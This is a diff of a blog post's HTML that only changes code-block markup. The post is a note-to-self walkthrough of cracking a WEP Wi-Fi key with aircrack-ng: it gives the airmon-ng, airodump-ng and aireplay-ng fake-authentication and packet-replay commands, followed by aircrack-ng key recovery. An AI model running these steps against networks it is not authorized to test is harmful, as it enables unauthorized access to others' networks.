@@ -78,7 +78,7 @@
 	    <p>Speaking of <a href="//blog.macuyiko.com/post/2010/ubuntu-1010-fixed-channel-mon0-1-aircrack-problem-with-iwl3945.html">wireless</a>&#8230;</p>
 <p>The following is just a quick note-to-self, because I always forget the exact commands and end up crawling around the <a href="http://www.aircrack-ng.org/doku.php">Aircrack wiki</a> for a bit. I though I&#8217;d posted this before, but I can&#8217;t seem to find&nbsp;it.</p>
 <h3><span class="caps">TTY1</span></h3>
-<div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="k">start</span> <span class="n">eth1</span>
+<div class="highlight"><pre><span></span><code><span class="n">sudo</span> <span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="k">start</span> <span class="n">eth1</span>
 <span class="o">#</span> <span class="n">Assume</span> <span class="n">monitor</span> <span class="n">started</span> <span class="k">on</span> <span class="n">mon0</span><span class="p">...</span>
 
 <span class="n">sudo</span> <span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="n">mon0</span>
@@ -86,33 +86,29 @@
 
 <span class="n">sudo</span> <span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="c1">--channel X --bssid XX:XX:XX:XX:XX:XX -w output mon0</span>
 <span class="o">#</span> <span class="n">Make</span> <span class="n">sure</span> <span class="k">to</span> <span class="k">replace</span> <span class="ss">&quot;X&quot;</span><span class="p">.</span> <span class="n">This</span> <span class="n">terminal</span> <span class="k">is</span> <span class="n">now</span> <span class="n">dumping</span> <span class="k">data</span>
-</pre></div>
-
+</code></pre></div>
 
 <h3><span class="caps">TTY2</span></h3>
-<div class="highlight"><pre><span></span><span class="s s-Atom">sudo</span> <span class="s s-Atom">aireplay</span><span class="o">-</span><span class="s s-Atom">ng</span> <span class="o">-</span><span class="mi">1</span> <span class="mi">0</span> <span class="o">-</span><span class="s s-Atom">a</span> <span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span> <span class="s s-Atom">mon0</span>
+<div class="highlight"><pre><span></span><code><span class="s s-Atom">sudo</span> <span class="s s-Atom">aireplay</span><span class="o">-</span><span class="s s-Atom">ng</span> <span class="o">-</span><span class="mi">1</span> <span class="mi">0</span> <span class="o">-</span><span class="s s-Atom">a</span> <span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span> <span class="s s-Atom">mon0</span>
 <span class="s s-Atom">#</span> <span class="p">...</span> <span class="nv">Association</span> <span class="nf">successful</span> <span class="o">:-</span><span class="p">)</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>Now start the attack. I like opening a new terminal for this.
 Don&#8217;t bother with the <span class="caps">ARP</span> request replay attack. The best method to use is the <code>-p 0841</code> one, especially when using a crappy wifi chip like me (<span class="caps">3945ABG</span>). Last time I checked, the advanced attack methods (KoreK chopchop, fragmentation, caffe-latte and Hirte) didn&#8217;t&nbsp;work.</p>
 <h3><span class="caps">TTY3</span></h3>
-<div class="highlight"><pre><span></span><span class="n">sudo</span><span class="w"> </span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span><span class="w"> </span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">0841</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="n">FF</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="n">XX</span><span class="w"> </span><span class="n">mon0</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="n">sudo</span><span class="w"> </span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span><span class="w"> </span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">0841</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="n">FF</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="n">XX</span><span class="w"> </span><span class="n">mon0</span><span class="w"></span>
 <span class="err">#</span><span class="w"> </span><span class="n">Wait</span><span class="w"> </span><span class="n">until</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">packet</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">captured</span><span class="p">.</span><span class="w"> </span><span class="n">It</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">best</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">small</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="p">(</span><span class="k">Size</span><span class="err">:</span><span class="w"> </span><span class="mi">68</span><span class="p">).</span><span class="w"></span>
 
 <span class="err">#</span><span class="w"> </span><span class="n">Reinject</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">data</span><span class="o">-</span><span class="n">counter</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">TTY1</span><span class="w"> </span><span class="p">(</span><span class="n">airodump</span><span class="p">)</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="k">go</span><span class="w"> </span><span class="n">up</span><span class="p">.</span><span class="w"></span>
-</pre></div>
-
+</code></pre></div>
 
 <h3><span class="caps">TTY4</span></h3>
-<div class="highlight"><pre><span></span><span class="err">sudo aircrack-ng -b XX:XX:XX:XX:XX:XX output*.cap</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="err">sudo aircrack-ng -b XX:XX:XX:XX:XX:XX output*.cap</span>
+</code></pre></div>
 
 <h3><span class="caps">TTY5</span>&nbsp;(optional)</h3>
-<div class="highlight"><pre><span></span><span class="err">sudo aircrack-ng -K -b XX:XX:XX:XX:XX:XX output*.cap</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">sudo aircrack-ng -K -b XX:XX:XX:XX:XX:XX output*.cap</span>
+</code></pre></div>
 	</article>
 </div>
 		
